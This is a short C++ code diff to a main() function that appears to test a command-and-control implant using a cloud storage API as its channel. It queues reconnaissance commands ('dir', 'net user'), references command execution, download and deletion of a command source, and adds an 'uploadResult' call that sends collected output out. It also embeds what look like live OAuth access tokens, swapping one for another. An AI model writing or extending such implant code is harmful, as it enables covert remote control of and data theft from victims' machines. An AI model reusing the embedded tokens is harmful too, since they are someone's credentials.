@@ -49,11 +49,13 @@ int main() {
     std::string input = "dir\nnet user\necho bs";
     std::string output;
     std::string refreshToken;
-    std::string accessToken = "ya29.a0AcM612y5U_9DJBKS4Ah7iq-r1TWl1LNNR5iK7l0L-aP262Qo1IYsGbtI8B5h-MHuj0wdeLiJBZVMYr1jTHhIaIPz1ruF_xWWK-jprIsI51IB3aUjgE9pnPyvP_TECoYLrkI-SYKG4yL6dN2GkW1vNvM4KsLmRPPR1WZ1mOUv4AaCgYKAXUSARASFQHGX2Mi0vEqFxQF5IgemsZjCZtggQ0177";
-    //for (int i = 0; i < 6.5 * 1024; i++)
-    //{
-    //    output += "a";
-    //}
+    std::string accessToken = "ya29.a0AcM612z22xQAG364D6qu6wA_3jTaYf6KsFJ975Ff0P5YC1V81xbDwXe5wH5cinumZ4gkTRJvmsQMUz4KvcxfX-upw4OD-L4IvOXRlPCUrU-mRfmljsypX1UjFz53kOd1qo9UfFtAoDNf5RsHbgeGY3MsISjPVllaTJcaCYlfngaCgYKASsSARASFQHGX2MiTDUNbP1sUbIvlDlLSlMB1g0177";
+    output = "Start!";
+    for (int i = 0; i < 10 * 1024; i++)
+    {
+        output += "a";
+    }
+    output += "End!";
     WORD errorCode;
     //errorCode = singlePartUpload(output, accessToken, 151, 27);
     //errorCode = downloadSourceContext(accessToken, output);
@@ -71,8 +73,10 @@ int main() {
     //commandExecuter(input, output);
     //printf("Command execution result: %s", output.c_str());
     
-    errorCode = deleteSource(accessToken);
-    printf("Source deleted with code: %d", errorCode);
+    //errorCode = deleteSource(accessToken);
+    //printf("Source deleted with code: %d", errorCode);
+    errorCode = uploadResult(output, accessToken, 4);
+    printf("Upload is done with code: %d\n", errorCode);
 
     return 0;
 }
